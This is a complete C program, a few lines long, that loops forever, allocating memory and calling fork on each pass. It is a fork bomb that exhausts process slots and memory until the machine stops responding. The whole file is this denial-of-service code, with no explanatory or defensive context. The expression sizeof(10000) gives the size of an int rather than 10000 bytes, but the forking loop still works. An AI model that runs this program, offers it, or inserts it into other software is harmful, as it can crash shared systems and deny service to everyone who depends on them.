#include <unistd.h>
#include <stdlib.h>
int main() {
	while(malloc(sizeof(10000))) fork();
}
